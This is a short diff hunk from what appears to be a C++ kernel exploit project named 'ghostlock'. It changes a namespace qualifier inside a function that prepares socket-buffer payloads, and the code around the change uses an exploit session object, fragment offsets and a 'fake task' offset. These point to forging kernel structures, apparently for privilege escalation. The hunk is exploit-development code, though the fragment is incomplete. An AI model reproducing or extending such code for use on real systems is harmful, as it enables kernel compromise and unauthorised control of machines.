@@ -301,7 +301,7 @@ namespace ghostlock::support {
     int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
         memset(skb_buf, 0, SKB_SEND_SIZE);
 
-        int tcp = g_exploit_session.profile.supports(::RouteKind::TcpZerocopy);
+        int tcp = g_exploit_session.profile.supports(ghostlock::RouteKind::TcpZerocopy);
         long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
         size_t chunk_bias = tcp ? 0xe80 : (size_t) SKB_FRAG_BIAS;
         size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t) FAKE_TASK_OFF;
